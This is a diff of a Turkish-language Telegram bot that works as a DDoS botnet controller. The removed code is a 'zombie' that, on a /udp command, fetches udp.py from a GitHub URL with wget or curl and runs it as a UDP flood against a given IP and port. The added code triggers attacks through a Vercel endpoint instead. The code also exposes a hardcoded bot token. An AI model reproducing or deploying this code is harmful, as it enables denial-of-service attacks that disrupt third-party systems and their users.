@@ -1,68 +1,27 @@
-import os
-import subprocess
-import time
-import sys
+import requests
 
-# --- OTOMATİK KÜTÜPHANE KURULUMU ---
-def install_requirements():
-    try:
-        import telebot
-    except ImportError:
-        os.system(f"{sys.executable} -m pip install pyTelegramBotAPI")
-        time.sleep(3)
-        import telebot
-
-install_requirements()
-import telebot
-
-# --- SENİN BİLGİLERİN ---
-TOKEN = "8818747282:AAGHb-qVWw-4eCZiFCEx1MC3h7OnoXeNLtI"
-ADMIN_ID = 2019064003
-
-bot = telebot.TeleBot(TOKEN)
-
-# --- /udp KOMUTU ---
-@bot.message_handler(commands=['udp'])
-def attack(message):
+@bot.message_handler(commands=['edge'])
+def edge_attack(message):
     if message.from_user.id == ADMIN_ID:
         try:
             args = message.text.split()
-            if len(args) < 5:
-                bot.reply_to(message, "❌ Kullanım: /udp IP PORT THREAD SÜRE")
+            if len(args) < 4:
+                bot.reply_to(message, "❌ Kullanım: /edge <ip> <port> <süre>")
                 return
+            
+            ip, port, sure = args[1], args[2], args[3]
+            
+            # YENİ LİNKİN BURASI KANKA
+            vercel_url = f"https://ordu-eta.vercel.app/?ip={ip}&port={port}&time={sure}"
+            
+            # Vercel'e tetik gönderiyoruz
+            response = requests.get(vercel_url, timeout=5)
+            
+            if response.status_code == 200:
+                bot.reply_to(message, f"🌍 **Washington (iad1) Hattı Açıldı!**\n🎯 Hedef: {ip}\n⏱ Süre: {sure} sn\n🚀 Mermiler yola çıktı!")
+            else:
+                bot.reply_to(message, "⚠️ Vercel cevap verdi ama motor teklemiş olabilir.")
                 
-            target, port, threads, duration = args[1], args[2], args[3], args[4]
-            
-            # udp.py yoksa GitHub'dan çek ve saldırıyı başlat
-            cmd = f"wget -q -O udp.py https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/udp.py || curl -s -L -o udp.py https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/udp.py; python3 udp.py {target} {port} {threads} {duration}"
-            
-            subprocess.Popen(cmd, shell=True)
-            bot.reply_to(message, f"🚀 Mermiler yağdırılıyor! \n🎯 Hedef: {target}:{port}\n⏰ Süre: {duration}sn")
-            
         except Exception as e:
-            bot.reply_to(message, f"❌ Hata: {str(e)}")
-
-# --- /stop KOMUTU ---
-@bot.message_handler(commands=['stop'])
-def stop_attack(message):
-    if message.from_user.id == ADMIN_ID:
-        try:
-            os.system("pkill -f udp.py")
-            bot.reply_to(message, "🛑 Operasyon durduruldu!")
-        except:
-            pass
-
-# İlk açılış mesajı
-try:
-    bot.send_message(ADMIN_ID, "🧟 Zombi hazır usta! Emirlerini bekliyorum.")
-except:
-    pass
-
-# --- CONFLICT (409) HATASINI ÖNLEYEN DÖNGÜ ---
-while True:
-    try:
-        # interval=5 yaparak zombilerin Telegram'ı sıkıştırmasını engelledik
-        bot.polling(non_stop=True, interval=5, timeout=30)
-    except Exception as e:
-        # Hata olursa 5 saniye bekle ve tekrar dene
-        time.sleep(5)
+            # Vercel bazen timeout verir ama saldırı arkada başlar
+            bot.reply_to(message, f"🚀 Saldırı tetiklendi kanka! (Not: {e})")
